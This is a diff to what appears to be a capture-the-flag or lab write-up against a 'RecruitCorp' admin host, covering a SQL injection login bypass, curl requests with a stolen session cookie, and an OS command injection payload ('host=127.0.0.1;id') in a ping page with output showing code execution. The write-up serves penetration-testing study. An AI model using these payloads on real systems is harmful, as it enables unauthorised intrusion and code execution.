@@ -45,5 +45,78 @@ Password = "Anything"
 
 The Username field is weak to SQL injections. I am able to bypass the login form and I am now logged in as admin 
 
+Now on this page I am able to look up a user by their ID. Let's curl this page and see what we are working with 
+curl -s -b cookies.txt http://10.129.147.83/admin/ -o admin.html
+curl -s -b cookies.txt http://10.129.147.83/admin/dashboard.php -o dashboard.html
+Results: 
+
+cat dashboard.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Dashboard - RecruitCorp Admin</title>
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<nav class="navbar">
+    <span class="brand">RecruitCorp Admin</span>
+    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
+</nav>
+<main class="container">
+    <div class="card">
+        <h1>Welcome back</h1>
+        <p class="muted">RecruitCorp internal admin console.</p>
+    </div>
+
+    <div class="card">
+        <h2>User Lookup</h2>
+        <p class="muted">Look up a user record by ID.</p>
+        <form method="GET" action="/admin/users/lookup.php" class="row-inline">
+            <div class="form-group">
+                <label for="id">User ID</label>
+                <input id="id" type="number" name="id" class="form-control" min="1" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Look up</button>
+        </form>
+    </div>
+
+    <div class="card">
+        <h2>Quick Links</h2>
+        <ul class="list">
+            <li><a href="/admin/users/lookup.php?id=1">View own profile</a></li>
+            <li><a href="/admin/logout.php">Sign out</a></li>
+        </ul>
+    </div>
+</main>
+</body>
+</html>
+
+Alright we are provided a form where we can only enter numeric data. 
+After playing around with some SQL injections it seemed like this was not the correct path. 
+Going in and manually searching for users I found an intersting note on user ID 7 
+
+User Lookup
+ID	7
+Username	sysmaint
+Role	system
+Notes	Service account for /admin/sysmaint-checks/ping.php. Do not disable.
+
+After trying to curl the page I was being met with Forbidden errors. 
+Going into the browser though I am able to get a response by enterting data into the URl path 
+Example: 
+
+http://10.129.147.83/admin/sysmaint-checks/ping.php?host=127.0.0.1;id
+Result: 
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
 
 
